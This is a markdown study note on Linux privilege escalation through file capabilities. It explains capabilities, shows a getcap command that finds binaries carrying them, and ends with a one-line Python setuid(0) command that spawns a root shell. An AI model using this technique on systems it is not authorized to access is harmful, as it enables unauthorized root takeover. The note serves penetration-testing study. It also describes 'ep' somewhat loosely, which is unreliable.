# Linux Privilege Escalation: Capabilities

## Contents
- [What are capabilities in Linux](#what-are-capabilities-in-linux)
- [Hunting Capabilities](#hunting-capabilities)
- [Example](#example)
- [Exploit for Priv Esc](#exploit-for-priv-esc)

## [What are capabilities in Linux](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
- Before capabilities, we only had the binary system of privileged and non-privileged processes and for the purpose of performing permission checks, traditional UNIX implementations distinguish two categories of processes: privileged processes that referred as superuser or root and unprivileged processes (whose effective UID is nonzero).
- Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks.
- Capabilities are a security implementation similar in some aspects to SUID.
  - Capabilities allow a more granular configuration of what permissions are granted to non-root users.
 
## Hunting Capabilities
```
getcap -r / 2>/dev/null   # -r : enables recursive search
```
- [getcap](https://man7.org/linux/man-pages/man8/getcap.8.html) is a Linux utility that allows users to query a capability database and look up capabilities embedded in a binary file.
- Automated tools like [LinPEAS](20_automating_local_enum.md) will also find it.
- If you find something, research it.

Programs that might be of interest to you if they have a Capability (especially the "ep"): 
- Python
- Perl
- SSH
- tar (can be used to read files, etc.)

## Example

![image](https://github.com/user-attachments/assets/6b859938-e20b-496f-8263-84b6e5b1e87d)

- This shows us that there is one capability set on one program on the system.
- This is a capability of SUID set on Python2.6 to "ep"
  - "p" = the binary has all the capabilities permitted from the start.
  - "e" = the binary has all the capabilities effective from the start.
  - Think about it as "permit [p] everything [e]."
  - It means all capabilities are enabled.
- If you have the capability of running Python as root, you can probably do bad things.

## Exploit for Priv Esc
- There is no "sudo" or preface command to run in order to exploit this Capability.
- You just have to run the Python binary with the Capability.
```
/usr/bin/Python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
- That gives you root.
